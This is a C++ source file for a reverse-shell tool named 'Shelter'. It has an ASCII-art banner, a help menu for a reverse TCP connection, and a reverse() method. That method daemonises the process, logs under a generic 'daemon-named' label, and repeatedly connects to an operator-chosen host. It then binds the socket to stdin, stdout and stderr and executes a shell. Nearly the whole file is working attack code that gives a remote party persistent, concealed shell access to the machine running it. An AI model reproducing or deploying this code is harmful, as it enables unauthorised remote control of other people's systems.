#include <iostream>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <syslog.h>
#include <argh.h>
#include <string>
#include <boost/lexical_cast.hpp>

using std::string;
using std::cout;
using std::cerr;
using std::endl;


class Shelter {
    public:

        void showBanner()
        {
            cout << R"(
                              __
                     /\    .-" /
                    /  ; .'  .' 
                   :   :/  .'   
                    \  ;-.'     
       .--""""--..__/     `.    
     .'           .'    `o  \   
    /                    `   ;  
   :                  \      :  
 .-;        -.         `.__.-'  
:  ;          \     ,   ;       
'._:           ;   :   (        
    \/  .__    ;    \   `-.     
     ;     "-,/_..--"`-..__)    
     '""--.._:

)";
        }

        void showHelp()
        {
            cout << "desc:\t Reverse TCP Connection" << endl;
            cout << "flag:\t -r, --reverse:" << endl;
            cout << "arg:\t -H <str>host -P <int>port" << endl;
            cout << "----------" << endl;
            cout << "desc:\t Verbose process" << endl;
            cout << "flag:\t -v, --verbose:" << endl;
            cout << "arg:\t -v <int>level" << endl;
            cout << "----------" << endl;
        }

        void reverse(string host, unsigned short port, string shell) {
            struct sockaddr_in sa;
            int s;
            pid_t pid, sid;
            pid = fork();
            
            if(pid > 0) exit(EXIT_SUCCESS);
            else if(pid < 0) exit(EXIT_FAILURE);
            umask(0);
           
            // Open system logs for the child process
            openlog("daemon-named", LOG_NOWAIT | LOG_PID, LOG_USER);
            syslog(LOG_NOTICE, "Successfully started daemon-name");

            // Generate a session ID for the child process
            sid = setsid();
            // Ensure a valid SID for the child process
            if(sid < 0)
            {
                // Log failure and exit
                syslog(LOG_ERR, "Could not generate session ID for child process");
                exit(EXIT_FAILURE);
            }

            close(STDIN_FILENO);
            close(STDOUT_FILENO);
            close(STDERR_FILENO);
            // Daemon-specific intialization should go here
            const int SLEEP_INTERVAL = 5;
            // Enter daemon loop
            while(1)
            {
                // Execute daemon heartbeat, where your recurring activity occurs
                // Sleep for a period of time
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(host.c_str());
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0); // stdin
                dup2(s, 1); // stdout
                dup2(s, 2); // stderr

                execve(shell.c_str(), 0, 0);
                sleep(SLEEP_INTERVAL);
            }
            // Close system logs for the child process
            syslog(LOG_NOTICE, "Stopping daemon-name");
            closelog();
            // Terminate the child process when the daemon completes
            exit(EXIT_SUCCESS);
        }
};
